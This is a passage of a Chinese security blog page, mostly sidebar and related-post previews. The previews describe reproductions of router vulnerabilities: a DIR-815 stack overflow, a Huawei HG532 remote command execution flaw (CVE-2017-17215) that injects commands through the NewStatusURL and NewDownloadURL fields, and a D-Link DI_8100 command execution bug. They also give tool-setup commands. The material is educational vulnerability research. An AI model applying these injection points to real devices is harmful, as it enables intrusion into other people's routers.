text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-14</div><div class="info-item-2">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</div></div><div class="info-2"><div class="info-item-1">复现环境及所需工具漏洞复现环境Ubuntu 24.04.2 LTS 基础工具配置基础的Pwn环境 + binwalk + sasquatch + qemupwn环境配置推荐YX-hueimie师傅的博客★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客★pwn 22.04环境搭建保姆级教程★_pwn环境搭建-CSDN博客 安装binwalk可以直接使用apt安装，也可以下载binwalk的源码来自己编译 1sudo apt install binwalk  sasquatch 是binwalk用于解压非标准SquashFS文件系统的关键依赖(入门不安装这个那么我们之后binwalk分解固件会发现里面 squashfs-root 文件夹是空的)安装方法如下: 123456# 安装依赖库（关键步骤，否则编译会失败） sudo apt-get install build-essential zlib1g-dev liblzma-dev liblzo2-dev # 克隆仓库并编译 git clone...</div></div></div></a><a class="pagination-related" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-12</div><div class="info-item-2">CVE-2017-17215 华为HG532路由器RCE漏洞复现</div></div><div class="info-2"><div class="info-item-1">漏洞描述CVE-2017-17215是CheckPoint团队披露的远程命令执行（RCE）漏洞，存在于华为HG532路由器中。该设备支持名为DeviceUpgrade的一种服务类型，可通过向/ctrlt/DeviceUpgrade_1的地址提交请求，来执行固件的升级操作。可通过向37215端口发送数据包，启用UPnP协议服务，并利用该漏洞，在NewStatusURL或NewDownloadURL标签中注入任意命令以执行。 漏洞披露:https://research.checkpoint.com/2017/good-zero-day-skiddie/ 附件下载:通过网盘分享的文件：HG532eV100R001C02B015_upgrade_main.bin链接: https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp 提取码: xidp 漏洞分析根据官方的漏洞报告，我们知道漏洞存在于/bin/upnp二进制文件按照官方报告中提到的 NewStatusURL 或 NewDownloadURL...</div></div></div></a><a class="pagination-related" href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="IOT入门--路由器命令执行漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-13</div><div class="info-item-2">IOT入门--路由器命令执行漏洞</div></div><div class="info-2"><div class="info-item-1">D-Link DI_8100命令执行漏洞复现所需工具Burp Suite​​-Linux下载BurpSuite v2024.10汉化无cmd框版（2024.11.03更新） - 吾爱破解 - 52pojie.cn 配置Burp Suite​​教程Burp Suite代理和火狐浏览器的设置(超详细)_burpsuite firefox-CSDN博客 固件下载地址:http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100 漏洞分析使用binwalk对固件进行分解 1binwalk -Me DI_8100-16.07.26A1.trx   查看一下系统架构以及保护  下面使用FirmAE对固件进行仿真进入FirmAE工具文件夹下，使用 run.sh 来进行启动 1sudo ./run.sh -d dlink &lt;DI_8100-16.07.26A1.trx的路径&gt;   选择2进入终端，然后使用ps命令查看进程我们发现程序启动之后 jhttpd 这个服务就启动了，所以我们主要的程序就是这个 jhttpd...</div></div></div></a><a class="pagination-related" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-14</div><div class="info-item-2">qemu搭建ARM64环境</div></div><div class="info-2"><div class="info-item-1">所需前置准备创建磁盘文件并下载内核镜像、内存盘镜像文件 12345678qemu-img create -f qcow2 debian-3607-aarch64.qcow2 32Gwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gzwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linuxwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/mini.iso  上述命令执行完毕之后可以得到下面这几个文件 1debian-3607-aarch64.qcow2...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">XiDP</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiDP0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">So get away</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">基础工具配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%BC%94%E7%A4%BA"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用演示</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境">qemu搭建ARM64环境</a><time datetime="2025-07-13T16:00:00.000Z" title="发表于 2025-07-14 00:00:00">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="IOT入门--路由器命令执行漏洞">IOT入门--路由器命令执行漏洞</a><time datetime="2025-07-12T16:00:00.000Z" title="发表于 2025-07-13 00:00:00">2025-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现">CVE-2017-17215 华为HG532路由器RCE漏洞复现</a><time datetime="2025-07-11T16:00:00.000Z" title="发表于 2025-07-12 00:00:00">2025-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/2025%20ISCC%20%E6%93%82%E5%8F%B0%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 ISCC 擂台赛Pwn-wp(含附件)">2025 ISCC 擂台赛Pwn-wp(含附件)</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/yu2.png);"><div id="footer-wrap"><div class="footer_custom_text">Let yourself go</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="(。・＿・。)ﾉ你好呀，希望博客里面的内容可以帮助到你" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>